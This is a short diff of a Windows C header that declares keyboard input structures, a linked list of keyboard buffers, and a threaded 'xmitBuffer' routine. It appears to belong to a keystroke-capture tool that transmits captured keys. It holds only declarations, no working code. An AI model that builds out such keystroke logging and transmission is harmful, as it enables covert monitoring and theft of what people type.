@@ -8,12 +8,15 @@
 #include <SDKDDKVer.h>
 
 #include <stdio.h>
+#include <windows.h>
 #include <tchar.h>
+#include <strsafe.h>
 
 typedef unsigned long ULONG;
 typedef unsigned short USHORT;
 typedef void *  PVOID;
 typedef unsigned char  BOOLEAN;
+typedef unsigned long  DWORD;
 
 typedef struct _KEYBOARD_INPUT_DATA {
 	union {
@@ -30,9 +33,11 @@ typedef struct _KEYBOARD_INPUT_DATA {
 
 typedef struct _LLIST {
 	struct _LLIST *previous;
-	PKEYBOARD_INPUT_DATA keyboardBuffer;
+	union {
+		PKEYBOARD_INPUT_DATA keyboardBuffer;
+		USHORT * keyboardFlag;
+	};
 } LLIST, *PLLIST;
 
 
-void xmitBuffer(char * echoString);
-
+DWORD WINAPI xmitBuffer(LPVOID voidPointer);
